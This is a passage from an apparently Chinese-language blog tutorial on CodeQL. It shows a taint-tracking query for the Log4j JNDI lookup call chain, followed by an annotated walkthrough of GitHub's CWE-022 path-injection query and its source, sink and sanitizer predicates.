        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.spi"</span><span class="token punctuation">,</span> <span class="token string">"AbstractLogger"</span><span class="token punctuation">)</span>
    }
}
class Logger2 extends RefType {
    Logger2<span class="token punctuation">(</span><span class="token punctuation">)</span> {
        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.core"</span><span class="token punctuation">,</span> <span class="token string">"Logger"</span><span class="token punctuation">)</span>
    }
}
class LoggerInput extends  Method {
    LoggerInput<span class="token punctuation">(</span><span class="token punctuation">)</span>{
        this<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof Logger2 <span class="token operator">and</span>
        this<span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span>
    }
    Parameter getAnUntrustedParameter<span class="token punctuation">(</span><span class="token punctuation">)</span> { result <span class="token operator">=</span> this<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> }
}
predicate isLookup<span class="token punctuation">(</span>Expr arg<span class="token punctuation">)</span> {
    <span class="token keyword">exists</span><span class="token punctuation">(</span>MethodAccess ma <span class="token operator">|</span>
        ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"lookup"</span>
        <span class="token operator">and</span>
        ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof Context
        <span class="token operator">and</span>
        arg <span class="token operator">=</span> ma<span class="token punctuation">.</span>getArgument<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span>
}

class TainttrackLookup  extends TaintTracking::Configuration {
    TainttrackLookup<span class="token punctuation">(</span><span class="token punctuation">)</span> { 
        this <span class="token operator">=</span> <span class="token string">"TainttrackLookup"</span> 
    }

    override predicate isSource<span class="token punctuation">(</span>DataFlow::Node source<span class="token punctuation">)</span> {
        <span class="token keyword">exists</span><span class="token punctuation">(</span>LoggerInput loggermethod <span class="token operator">|</span>
            source<span class="token punctuation">.</span>asParameter<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> loggermethod<span class="token punctuation">.</span>getAnUntrustedParameter<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    }
    override predicate isSink<span class="token punctuation">(</span>DataFlow::Node sink<span class="token punctuation">)</span> {
        <span class="token keyword">exists</span><span class="token punctuation">(</span>Expr arg <span class="token operator">|</span>
            isLookup<span class="token punctuation">(</span>arg<span class="token punctuation">)</span>
            <span class="token operator">and</span>
            sink<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> arg
        <span class="token punctuation">)</span>
    }
    override predicate isAdditionalTaintStep<span class="token punctuation">(</span>DataFlow::Node fromNode<span class="token punctuation">,</span> DataFlow::Node toNode<span class="token punctuation">)</span> {
        <span class="token keyword">exists</span><span class="token punctuation">(</span>MethodAccess ma<span class="token punctuation">,</span>MethodAccess ma2 <span class="token operator">|</span>
            <span class="token comment">//set fromNode</span>
            ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.core.impl"</span><span class="token punctuation">,</span> <span class="token string">"ReusableLogEventFactory"</span><span class="token punctuation">)</span> 
            <span class="token operator">and</span> ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"createEvent"</span><span class="token punctuation">)</span> 
            <span class="token operator">and</span> fromNode<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span>ma<span class="token punctuation">.</span>getArgument<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> 
            <span class="token comment">//set toNode</span>
            <span class="token operator">and</span> ma2<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.core.config"</span><span class="token punctuation">,</span> <span class="token string">"LoggerConfig"</span><span class="token punctuation">)</span>  
            <span class="token operator">and</span> ma2<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span> 
            <span class="token operator">and</span> ma2<span class="token punctuation">.</span>getArgument<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>toString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">"logEvent"</span>
            <span class="token operator">and</span> toNode<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span>ma2<span class="token punctuation">.</span>getArgument<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>
    }
} 
<span class="token keyword">from</span> TainttrackLookup config <span class="token punctuation">,</span> DataFlow::PathNode source<span class="token punctuation">,</span> DataFlow::PathNode sink
<span class="token keyword">where</span>
    config<span class="token punctuation">.</span>hasFlowPath<span class="token punctuation">(</span>source<span class="token punctuation">,</span> sink<span class="token punctuation">)</span>
<span class="token keyword">select</span> sink<span class="token punctuation">.</span>getNode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> source<span class="token punctuation">,</span> sink<span class="token punctuation">,</span> <span class="token string">"unsafe lookup"</span><span class="token punctuation">,</span> source<span class="token punctuation">.</span>getNode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"this is user input"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://s2.loli.net/2022/07/11/7ejs8RnATl2YtaD.png" alt="image-20220623160056489"></p>
<p>前面的调用链几乎分析地差不多了，但仍存在一个错误：</p>
<blockquote>
<p>原调用链的log方法会走到到<code>org/apache/logging/log4j/core/config/DefaultReliabilityStrategy.log</code>下，而此处codeql却分析到了<code>org\apache\logging\log4j\core\config\AwaitUnconditionallyReliabilityStrategy.java</code>（windows路径反斜杠是世界上最反人类的设计）。这两个类都继承自<code>ReliabilityStrategy</code> <code>LocationAwareReliabilityStrategy</code></p>
</blockquote>
<p>除去此错误，大部分调用链和原漏洞调试结果一样</p>
<p>reference(where my code copy from):</p>
<p><a target="_blank" rel="noopener" href="https://github.com/ASTTeam/CodeQL">https://github.com/ASTTeam/CodeQL</a> 国内比较全的codeql相关资源总结</p>
<h2 id="嫖来的规则实例"><a href="#嫖来的规则实例" class="headerlink" title="嫖来的规则实例"></a>嫖来的规则实例</h2><h3 id="isSource"><a href="#isSource" class="headerlink" title="isSource"></a>isSource</h3><h4 id="以某个方法的参数作为source"><a href="#以某个方法的参数作为source" class="headerlink" title="以某个方法的参数作为source"></a>以某个方法的参数作为source</h4><p>添加了几种过滤方式，第一个参数、该方法当前类的全限定名为xxxx</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">override predicate isSource<span class="token punctuation">(</span>DataFlow::Node source<span class="token punctuation">)</span> {
    <span class="token keyword">exists</span><span class="token punctuation">(</span>Parameter p <span class="token operator">|</span>
        p<span class="token punctuation">.</span>getCallable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"readValue"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
        source<span class="token punctuation">.</span>asParameter<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> p <span class="token operator">and</span>
        source<span class="token punctuation">.</span>asParameter<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getPosition<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token operator">and</span> p<span class="token punctuation">.</span>getCallable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"com.service.impl"</span><span class="token punctuation">,</span> <span class="token string">"xxxxx"</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span>
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="以某个实例的所有参数作为source"><a href="#以某个实例的所有参数作为source" class="headerlink" title="以某个实例的所有参数作为source"></a>以某个实例的所有参数作为source</h4><p>(<code>X1 x1 = new X1(a,b)</code>，这里a、b作为source)，过滤：调用该实例的方法名称为<code>Caller</code>，实例类型名称为<code>X1</code></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">override predicate isSource<span class="token punctuation">(</span>DataFlow::Node source<span class="token punctuation">)</span> {
    <span class="token keyword">exists</span><span class="token punctuation">(</span>ClassInstanceExpr ma <span class="token operator">|</span>
        source<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> ma<span class="token punctuation">.</span>getAnArgument<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token operator">and</span> ma<span class="token punctuation">.</span>getTypeName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>toString<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"X1"</span>
        <span class="token operator">and</span> ma<span class="token punctuation">.</span>getCaller<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"Caller"</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span>
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="path-injection"><a href="#path-injection" class="headerlink" title="path-injection"></a>path-injection</h2><p>CEW-022</p>
<p>用于检测文件相关，可以是文件上传、文件读取。主要判断逻辑是对与传入文件操作时文件名是否可控</p>
<p><code>java\ql\src\Security\CWE\CWE-022\TaintedPath.ql:</code></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">/**
 * @name Uncontrolled data used in path expression
 * @description Accessing paths influenced by users can allow an attacker to access unexpected resources.
 * @kind path-problem
 * @problem.severity error
 * @security-severity 7.5
 * @precision high
 * @id java/path-injection
 * @tags security
 *       external/cwe/cwe-022
 *       external/cwe/cwe-023
 *       external/cwe/cwe-036
 *       external/cwe/cwe-073
 */</span>

<span class="token keyword">import</span> java
<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>FlowSources
<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>PathCreation
<span class="token keyword">import</span> DataFlow::PathGraph
<span class="token keyword">import</span> TaintedPathCommon

class ContainsDotDotSanitizer extends DataFlow::BarrierGuard {
  ContainsDotDotSanitizer<span class="token punctuation">(</span><span class="token punctuation">)</span> {
    this<span class="token punctuation">.</span><span class="token punctuation">(</span>MethodAccess<span class="token punctuation">)</span><span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"contains"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
    this<span class="token punctuation">.</span><span class="token punctuation">(</span>MethodAccess<span class="token punctuation">)</span><span class="token punctuation">.</span>getAnArgument<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>StringLiteral<span class="token punctuation">)</span><span class="token punctuation">.</span>getValue<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">".."</span>
  }

  override predicate checks<span class="token punctuation">(</span>Expr e<span class="token punctuation">,</span> <span class="token keyword">boolean</span> branch<span class="token punctuation">)</span> {
    e <span class="token operator">=</span> this<span class="token punctuation">.</span><span class="token punctuation">(</span>MethodAccess<span class="token punctuation">)</span><span class="token punctuation">.</span>getQualifier<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> branch <span class="token operator">=</span> <span class="token boolean">false</span>
  }
}

class TaintedPathConfig extends TaintTracking::Configuration {
  TaintedPathConfig<span class="token punctuation">(</span><span class="token punctuation">)</span> { this <span class="token operator">=</span> <span class="token string">"TaintedPathConfig"</span> }

  override predicate isSource<span class="token punctuation">(</span>DataFlow::Node source<span class="token punctuation">)</span> { source instanceof RemoteFlowSource }

  override predicate isSink<span class="token punctuation">(</span>DataFlow::Node sink<span class="token punctuation">)</span> {
    <span class="token keyword">exists</span><span class="token punctuation">(</span>Expr e <span class="token operator">|</span> e <span class="token operator">=</span> sink<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span> e <span class="token operator">=</span> <span class="token keyword">any</span><span class="token punctuation">(</span>PathCreation p<span class="token punctuation">)</span><span class="token punctuation">.</span>getAnInput<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token operator">not</span> guarded<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
  }<span class="token comment">//</span>

  override predicate isSanitizer<span class="token punctuation">(</span>DataFlow::Node node<span class="token punctuation">)</span> {
    <span class="token keyword">exists</span><span class="token punctuation">(</span><span class="token keyword">Type</span> t <span class="token operator">|</span> t <span class="token operator">=</span> node<span class="token punctuation">.</span>getType<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span> t instanceof BoxedType <span class="token operator">or</span> t instanceof PrimitiveType<span class="token punctuation">)</span>
  }

  override predicate isSanitizerGuard<span class="token punctuation">(</span>DataFlow::BarrierGuard guard<span class="token punctuation">)</span> {
    guard instanceof ContainsDotDotSanitizer
  }
}

<span class="token keyword">from</span> DataFlow::PathNode source<span class="token punctuation">,</span> DataFlow::PathNode sink<span class="token punctuation">,</span> PathCreation p<span class="token punctuation">,</span> TaintedPathConfig conf
<span class="token keyword">where</span>
  sink<span class="token punctuation">.</span>getNode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> p<span class="token punctuation">.</span>getAnInput<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span>
  conf<span class="token punctuation">.</span>hasFlowPath<span class="token punctuation">(</span>source<span class="token punctuation">,</span> sink<span class="token punctuation">)</span>
<span class="token keyword">select</span> p<span class="token punctuation">,</span> source<span class="token punctuation">,</span> sink<span class="token punctuation">,</span> <span class="token string">"$@ flows to here and is used in a path."</span><span class="token punctuation">,</span> source<span class="token punctuation">.</span>getNode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token string">"User-provided value"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将关注点放在<code>class TaintedPathConfig</code>上：</p>
<h3 id="isSource-1"><a href="#isSource-1" class="headerlink" title="isSource"></a>isSource</h3><p>这里对isSource进行了重写，指向RemoteFlowSource，其中定义了用户输入可控的常见源。</p>
<h3 id="isSink"><a href="#isSink" class="headerlink" title="isSink"></a>isSink</h3><p>语句：<code>exists(Expr e | e = sink.asExpr() | e = any(PathCreation p).getAnInput() and not guarded(e))</code></p>
<p>这里实例化了<code>PathCreation</code> 类，使用了谓词<code>guarded</code>，我们逐一进行分析：</p>
<h4 id="PathCreation"><a href="#PathCreation" class="headerlink" title="PathCreation"></a><code>PathCreation</code></h4><p>定义在<code>java\ql\lib\semmle\code\java\security\PathCreation.qll</code>中</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">
abstract class PathCreation extends Expr {
    abstract Expr getInput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  }
  
  class PathsGet extends PathCreation<span class="token punctuation">,</span> MethodAccess {
    <span class="token comment">// 寻找`java.nio.file.Paths`类下的get方法</span>
    PathsGet<span class="token punctuation">(</span><span class="token punctuation">)</span> {
      <span class="token keyword">exists</span><span class="token punctuation">(</span>Method m <span class="token operator">|</span> m <span class="token operator">=</span> this<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span>
        m<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof TypePaths <span class="token operator">and</span>
        m<span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"get"</span>
      <span class="token punctuation">)</span>
    }
    <span class="token comment">// 返回这个方法的集合</span>
    override Expr getInput<span class="token punctuation">(</span><span class="token punctuation">)</span> { result <span class="token operator">=</span> this<span class="token punctuation">.</span>getAnArgument<span class="token punctuation">(</span><span class="token punctuation">)</span> }
  }
  
  class FileSystemGetPath extends PathCreation<span class="token punctuation">,</span> MethodAccess {
    <span class="token comment">// 寻找`java.nio.file.FileSystem`类下的getPath方法并通过getInput方法返回这个集合</span>
    FileSystemGetPath<span class="token punctuation">(</span><span class="token punctuation">)</span> {
      <span class="token keyword">exists</span><span class="token punctuation">(</span>Method m <span class="token operator">|</span> m <span class="token operator">=</span> this<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span>
        m<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof TypeFileSystem <span class="token operator">and</span>
        m<span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"getPath"</span>
      <span class="token punctuation">)</span>
    }
  
    override Expr getInput<span class="token punctuation">(</span><span class="token punctuation">)</span> { result <span class="token operator">=</span> this<span class="token punctuation">.</span>getAnArgument<span class="token punctuation">(</span><span class="token punctuation">)</span> }
  }
  
  class FileCreation extends PathCreation<span class="token punctuation">,</span> ClassInstanceExpr {
    <span class="token comment">//   限定实例化的对象的原型在`java.io.File`类下</span>
    <span class="token comment">// 例如new xxx()  这个xxx必须在`java.io.File`下</span>
    FileCreation<span class="token punctuation">(</span><span class="token punctuation">)</span> { this<span class="token punctuation">.</span>getConstructedType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof TypeFile }
  
    override Expr getInput<span class="token punctuation">(</span><span class="token punctuation">)</span> {
        <span class="token comment">// 获得上述实例化的class的参数，并且这个参数的类型必须是file类型的，并返回满足and条件的参数集合</span>
      result <span class="token operator">=</span> this<span class="token punctuation">.</span>getAnArgument<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span>
      <span class="token comment">// Relevant arguments include those that are not a `File`.</span>
      <span class="token operator">not</span> result<span class="token punctuation">.</span>getType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof TypeFile
    }
  }
  
  class FileWriterCreation extends PathCreation<span class="token punctuation">,</span> ClassInstanceExpr {
    <span class="token comment">//   限定在`java.io.FileWriter`类下</span>
    FileWriterCreation<span class="token punctuation">(</span><span class="token punctuation">)</span> { this<span class="token punctuation">.</span>getConstructedType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"java.io.FileWriter"</span> }
    <span class="token comment">// 返回参数类型是String类型的参数</span>
    override Expr getInput<span class="token punctuation">(</span><span class="token punctuation">)</span> {
      result <span class="token operator">=</span> this<span class="token punctuation">.</span>getAnArgument<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span>
      <span class="token comment">// Relevant arguments are those of type `String`.</span>
      result<span class="token punctuation">.</span>getType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof TypeString
    }
  }
  
  predicate inWeakCheck<span class="token punctuation">(</span>Expr e<span class="token punctuation">)</span> {
    <span class="token comment">// None of these are sufficient to guarantee that a string is safe.</span>
    <span class="token comment">// 约束一个类下的方法如果是startswith等方法，注意这里的方法是原生的，这里建议扩大覆盖范围，使用matches去匹配类似的方法名</span>
    <span class="token keyword">exists</span><span class="token punctuation">(</span>MethodAccess m<span class="token punctuation">,</span> Method def <span class="token operator">|</span> m<span class="token punctuation">.</span>getQualifier<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> e <span class="token operator">and</span> m<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> def <span class="token operator">|</span>
      def<span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"startsWith"</span> <span class="token operator">or</span>
      def<span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"endsWith"</span> <span class="token operator">or</span>
      def<span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"isEmpty"</span> <span class="token operator">or</span>
      def<span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"equals"</span>
    <span class="token punctuation">)</span>
    <span class="token operator">or</span>
    <span class="token comment">// Checking against `null` has no bearing on path traversal.</span>
    <span class="token keyword">exists</span><span class="token punctuation">(</span>EqualityTest b <span class="token operator">|</span> b<span class="token punctuation">.</span>getAnOperand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> e <span class="token operator">|</span> b<span class="token punctuation">.</span>getAnOperand<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof NullLiteral<span class="token punctuation">)</span>
  }
  
  <span class="token comment">// Ignore cases where the variable has been checked somehow,</span>
  <span class="token comment">// but allow some particularly obviously bad cases.</span>
  predicate guarded<span class="token punctuation">(</span>VarAccess e<span class="token punctuation">)</span> {
    <span class="token comment">//   一个参数必须存在于上面抽象类返回结果的集合中且条件分支为True的情况下的方法，还要不是StartsWith等方法</span>
    <span class="token keyword">exists</span><span class="token punctuation">(</span>PathCreation p <span class="token operator">|</span> e <span class="token operator">=</span> p<span class="token punctuation">.</span>getInput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">and</span>
    <span class="token keyword">exists</span><span class="token punctuation">(</span>ConditionBlock cb<span class="token punctuation">,</span> Expr c <span class="token operator">|</span>
      cb<span class="token punctuation">.</span>getCondition<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getAChildExpr<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> c <span class="token operator">and</span>
      c <span class="token operator">=</span> e<span class="token punctuation">.</span>getVariable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getAnAccess<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span>
      cb<span class="token punctuation">.</span>controls<span class="token punctuation">(</span>e<span class="token punctuation">.</span>getBasicBlock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">and</span>
      <span class="token comment">// Disallow a few obviously bad checks.</span>
      <span class="token operator">not</span> inWeakCheck<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    <span class="token punctuation">)</span>
  }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>获取用于创建路径的输入，定义了常见用法。使用方式通过调用<code>getAnInput()</code>谓词获取方法内的所有参数，也就是将<code>sink</code>定义为传入的文件名。</p>
<h4 id="guarded"><a href="#guarded" class="headerlink" title="guarded"></a><code>guarded</code></h4><p>定义在<code>java\ql\src\Security\CWE\CWE-022\TaintedPathCommon.qll</code></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">predicate guarded<span class="token punctuation">(</span>VarAccess e<span class="token punctuation">)</span> {
  <span class="token keyword">exists</span><span class="token punctuation">(</span>PathCreation p <span class="token operator">|</span> e <span class="token operator">=</span> p<span class="token punctuation">.</span>getAnInput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//强调变量调用为文件名 and</span>
  <span class="token keyword">exists</span><span class="token punctuation">(</span>ConditionBlock cb<span class="token punctuation">,</span> Expr c <span class="token operator">|</span>
    cb<span class="token punctuation">.</span>getCondition<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getAChildExpr<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> c <span class="token comment">//将代码块的子表达式与c表达式进行匹配 and</span>
    c <span class="token operator">=</span> e<span class="token punctuation">.</span>getVariable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getAnAccess<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//文件名的所有调用和表达式c匹配 and</span>
    cb<span class="token punctuation">.</span>controls<span class="token punctuation">(</span>e<span class="token punctuation">.</span>getBasicBlock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token comment">//如果传入的e.getBasicBlock()是由该条件控制的基本块，即条件为true的基本块，则保持成立。 </span>
    <span class="token operator">and</span>
    <span class="token operator">not</span> inWeakCheck<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
  <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中<code>cb</code>是<code>ConditionBlock</code>实例化而来。</p>
<blockquote>
<ul>
<li>cb：获取的是整个块，方法开始<code>{}</code>整个内容</li>
<li>cb.getCondition()：表示获取此基本块最后一个节点条件</li>
<li>cb.getCondition().getAChildExpr()：表示获取子表达式</li>
</ul>
</blockquote>
<h3 id="isSanitizer"><a href="#isSanitizer" class="headerlink" title="isSanitizer"></a>isSanitizer</h3><p>如果数据类型是基本类型或者是其包装类则清洗掉</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">override predicate isSanitizer<span class="token punctuation">(</span>DataFlow::Node node<span class="token punctuation">)</span> {
    <span class="token keyword">exists</span><span class="token punctuation">(</span><span class="token keyword">Type</span> t <span class="token operator">|</span> t <span class="token operator">=</span> node<span class="token punctuation">.</span>getType<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span> t instanceof BoxedType <span class="token operator">or</span> t instanceof PrimitiveType<span class="token punctuation">)</span>
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="isSanitizerGuard"><a href="#isSanitizerGuard" class="headerlink" title="isSanitizerGuard"></a>isSanitizerGuard</h3><p>这里也是起到清洗作用，当调用方法为<code>contains</code>并且其参数值为<code>..</code>，对表达式<code>e</code>的判断为<code>false</code>则条件成立。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">class ContainsDotDotSanitizer extends DataFlow::BarrierGuard {
    ContainsDotDotSanitizer<span class="token punctuation">(</span><span class="token punctuation">)</span> {
